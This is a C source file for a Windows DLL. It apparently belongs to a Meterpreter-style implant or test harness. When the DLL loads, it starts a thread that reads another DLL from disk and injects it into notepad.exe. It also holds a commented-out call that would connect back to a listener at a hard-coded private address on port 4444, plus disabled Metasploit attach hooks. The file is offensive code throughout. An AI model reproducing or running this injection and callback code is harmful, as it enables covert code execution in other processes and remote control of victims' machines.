#include <windows.h>
#include <process.h>
#include <stdint.h>
#include <stdio.h>

#define URL  L"tcp://172.16.65.129:4444"
//#define URL  L"tcp://127.0.0.1:4444"

HINSTANCE hAppInstance;
DWORD server_setup_default(wchar_t *url);
DWORD inject(const wchar_t *procname, LPVOID lpDllBuffer, DWORD dwDllLength);

static int _inject(const wchar_t *procname, const char *dll)
{
	FILE *fp;

	if ((fp = fopen(dll, "rb")) == NULL)
		return -1;
	
	fseek(fp, 0, SEEK_END);

	long int size = ftell(fp);
	char *buffer = malloc(size);

	fread(buffer, size, 1, fp);
	fclose(fp);
	inject(procname, buffer, size);
	free(buffer);
	return 0;
}

uint32_t threadProc(void* param)
{
	_inject(L"notepad.exe","test.dll");
    //server_setup_default(URL);
    return 0;
}

void run() 
{
    unsigned tid;
    uintptr_t t = _beginthreadex(NULL,0,threadProc,NULL,0,&tid);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
#if 0
	case DLL_METASPLOIT_ATTACH:
		//bReturnValue = Init((MetsrvConfig*)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		//if (lpReserved != NULL)
		//	*(HMODULE*)lpReserved = hAppInstance;
		break;
#endif
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
        run();
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}